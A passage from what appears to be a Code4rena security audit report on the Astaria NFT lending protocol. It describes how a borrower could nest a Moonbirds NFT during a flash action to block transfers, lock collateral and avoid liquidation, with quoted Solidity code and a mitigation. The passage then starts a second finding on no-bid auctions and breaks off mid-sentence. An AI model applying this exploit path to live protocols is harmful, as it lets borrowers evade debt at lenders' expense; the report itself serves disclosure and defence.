class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The crucial part is that the normal safeTransferFrom is used.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, if the tokenContract is Moonbird NFT, the adversary can game the flashAucton feature to block further flashAction after trading the collateral token.</p>\n<p>We need to look into the MoonBird NFT.</p>\n<p>Moonbird NFT is one of the bluechip that has a large communtiy and high trading volume.</p>\n<p><a href=\"https://cointelegraph.com/news/bluechip-nft-project-moonbirds-signs-with-hollywood-talent-agents-uta\">https://cointelegraph.com/news/bluechip-nft-project-moonbirds-signs-with-hollywood-talent-agents-uta</a></p>\n<p>This NFT MoonBird has a feature: bird nesting.</p>\n<p><a href=\"https://www.moonbirds.xyz/\">https://www.moonbirds.xyz/</a></p>\n<blockquote>\n<p>Moonbirds come with a unique PFP design that allows them to be locked up and nested without leaving your wallet.</p>\n</blockquote>\n<blockquote>\n<p>As soon as your Moonbird is nested, they’ll begin to accrue additional benefits. As total nested time accumulates, you’ll see your Moonbird achieve new tier levels, upgrading their nest.</p>\n</blockquote>\n<p>The important things is that: when nesting is activated, the normal transfer is disabled (meaning the NFT trading for nested bird is disabled because normal transfer will revert) but user can use a speical function safeTransferWhileNesting to move NFT around.</p>\n<p>How is this feature implemented?</p>\n<p>Here is the function toggleNesting function</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Changes the Moonbird&#39;s nesting status.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toggleNesting</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">onlyApprovedOrOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span></code></pre>\n<p><a href=\"https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L319\">https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L319</a></p>\n<p>When the nesting is active, normal transfer is disabled. If the user tries to transfer while nesting, transaction will revert in _beforeTokenTransfers</p>\n<p><a href=\"https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L272\">https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L272</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Block transfers while nesting.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_beforeTokenTransfers</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quantity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startTokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">quantity</span><span class=\"mtk1\">; </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">end</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">nestingStarted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">nestingTransfer</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk8\">&quot;Moonbirds: nesting&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Here is an example transaction that revert when user tries to transfer while nesting.</p>\n<p><a href=\"https://etherscan.io/tx/0x21caf32e33f37d808054bf9ef33273a1347961dfc914819fc972cc5f44d7e62e\">https://etherscan.io/tx/0x21caf32e33f37d808054bf9ef33273a1347961dfc914819fc972cc5f44d7e62e</a></p>\n<p>Here is an example transaction that users try to toggle nesting</p>\n<p><a href=\"https://etherscan.io/tx/0xefc7b7e683b17b623b96c628e684613ab7e637f5e74dec7abdedebb99b4e64d1\">https://etherscan.io/tx/0xefc7b7e683b17b623b96c628e684613ab7e637f5e74dec7abdedebb99b4e64d1</a></p>\n<p>If the NFT bird is in nesting, the user can call a speical function safeTransferWhileNesting to move NFT around.</p>\n<p><a href=\"https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L258\">https://etherscan.io/address/0x23581767a106ae21c074b2276d25e5c3e136a68b#code#F1#L258</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeTransferWhileNesting</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Moonbirds: Only owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">nestingTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">nestingTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Example transaction for safeTransferWhileNesting</p>\n<p><a href=\"https://etherscan.io/tx/0x8d80610ff84c0f874fef28b351852e206fc38fe2818627881e437ed661d77fda\">https://etherscan.io/tx/0x8d80610ff84c0f874fef28b351852e206fc38fe2818627881e437ed661d77fda</a></p>\n<p><strong>Ok, now we can formalize the exploit path:</strong></p>\n<ol>\n<li>A adversay acquires the collateral token so he can call flash action.</li>\n<li>He calls the flash auction, and within the transaction he hold the moonbird NFT.</li>\n<li>He toggle the nesting on, and use safeTransferWhileNesting to transfer the NFT back.</li>\n<li>The ownership validation code will pass because the NFT is transferred back.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"161\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionNFTNotReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"5\">\n<li>The adversary sell collateral token to others. But other user tries to use flash auction on the moonbird.</li>\n<li>Transaction revert in safeTransferFrom because while the moonbird nesting is on, safeTransferWhileNesting needs to be called to transfer NFT, but protocol does not support such function and the protocol does not support the transction that toggle the moonbird nesting off.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"162\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The impact is severe, the new owner cannot use flashAuction.</p>\n<p>In fact, all ERC721(tokenContract).safeTransferFrom call is blocked, the NFT cannot be liquidated because normal liquidation also requires transferFrom to change the ownership and settle the trade. </p>\n<p>liquidatorNFTClaim also revert because the function calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"163\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ClearingHouse</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">CH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleLiquidatorNFTClaim</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_releaseToAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which calls _releaseToAddress</p>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"164\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_releaseToAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">releaseTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">underlyingAsset</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">underlyingAsset</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">releaseTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReleaseTo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">underlyingAsset</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">underlyingAsset</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">releaseTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>which calls transferUnderlying, which use ERC721(tokenContract).safeTransferFrom, which reverts while the moonbird nesting is on.</p>\n<p>the function releaseToAddress is blocked and the NFT is locked in CollateralToken</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"165\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">releaseToAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">releaseTo</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">releaseCheck</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_releaseToAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">releaseTo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Who have such incentives to exploits this feature? For example, a user use moonbird to borrow 10 ETH, but he does not want to pay the outstanding debt and does not want to get the NFT liquidated. He can exploit the moonbird to lock NFT. Without liquidating the NFT and locking the NFT, the lender bears the loss on the bad debt.</p>\n<h3 id=\"coded-poc\" style=\"position:relative;\"><a href=\"#coded-poc\" aria-label=\"coded poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Coded POC</h3>\n<p>Let us see the normal flashAction flow and then see how the above-mentioned exploit path can block further flashAction.</p>\n<p><em>Note: see warden’s <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/70\">original submission</a> for full details.</em></p>\n<h3 id=\"tools-used-16\" style=\"position:relative;\"><a href=\"#tools-used-16\" aria-label=\"tools used 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-53\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-53\" aria-label=\"recommended mitigation steps 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol whitelist the NFT address that can be used in the protocol to make sure such edge case does not impact the borrower and lender.</p>\n<h2 id=\"04-if-an-auction-has-no-bidder-the-nft-ownership-should-go-back-to-the-loan-lenders-instead-of-liquidator\" style=\"position:relative;\"><a href=\"#04-if-an-auction-has-no-bidder-the-nft-ownership-should-go-back-to-the-loan-lenders-instead-of-liquidator\" aria-label=\"04 if an auction has no bidder the nft ownership should go back to the loan lenders instead of liquidator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/50\">[04] If an auction has no bidder, the NFT ownership should go back to the loan lenders instead of liquidator</a></h2>\n<p>If auction has no bidder, the liquidator can claim the NFT. The impact is severe:</p>\n<ul>\n<li>Lenders could suffer fund loss in some cases.</li>\n<li>The unfair mechanism will discourage future users.</li>\n</ul>\n<h3 id=\"proof-of-concept-47\" style=\"position:relative;\"><a href=\"#proof-of-concept-47\" aria-label=\"proof of concept 47 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>After the auction period, the collateral will be released to the initiator. Essentially, the initiator gets the NFT for 